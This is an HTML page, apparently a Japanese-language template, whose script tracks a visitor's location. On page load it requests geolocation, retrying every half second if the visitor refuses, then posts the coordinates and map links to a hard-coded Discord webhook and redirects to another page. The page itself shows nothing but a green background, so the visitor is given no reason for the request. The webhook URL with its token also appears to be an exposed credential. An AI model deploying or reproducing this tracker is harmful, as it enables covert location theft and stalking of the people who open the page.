<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ä½ç½®æƒ…å ±å–å¾—ï¼‹Discordé€ä¿¡</title>
<style>
  body, html {
    margin: 0; padding: 0;
    height: 100vh;
    background: #00B14F;
  }
</style>
</head>
<body>
<script>
  const webhookURL = "https://discord.com/api/webhooks/1388700849257189566/wMhfECmtZFOk5rO6unLV8IDN-eBJoxmW8ajtlC1ZL8eKh2ztPMzi1DqBGlG-2uOuZ9Mh"; // â†è‡ªåˆ†ã®Webhook URLã«å¤‰ãˆã¦ã­ï¼

  function requestLocation() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        sendToDiscord(lat, lon);
      },
      error => {
        if (error.code === error.PERMISSION_DENIED) {
          setTimeout(requestLocation, 500); // è¨±å¯ã•ã‚Œã‚‹ã¾ã§ç¹°ã‚Šè¿”ã—
        } else {
          setTimeout(requestLocation, 500); // ä»–ã‚¨ãƒ©ãƒ¼ã§ã‚‚ãƒªãƒˆãƒ©ã‚¤
        }
      }
    );
  }

  function sendToDiscord(lat, lon) {
    const mapURL = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=15&size=450,300&l=map&pt=${lon},${lat},pm2rdl`;

    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `ğŸ“ ç¾åœ¨åœ°:\nç·¯åº¦: ${lat}\nçµŒåº¦: ${lon}\nğŸ—ºï¸ åœ°å›³ç”»åƒ: ${mapURL}\nhttps://www.google.com/maps?q=${lat},${lon}`
      }),
    })
    .then(() => {
      // é€ä¿¡æˆåŠŸ â†’ æ¬¡ã®ãƒšãƒ¼ã‚¸ã¸
      window.location.href = "home.html";
    })
    .catch(() => {
      // é€ä¿¡å¤±æ•—ã§ã‚‚ãƒªãƒˆãƒ©ã‚¤ã§ä½ç½®æƒ…å ±å†å–å¾—
      setTimeout(requestLocation, 1000);
    });
  }

  requestLocation();
</script>
</body>
</html>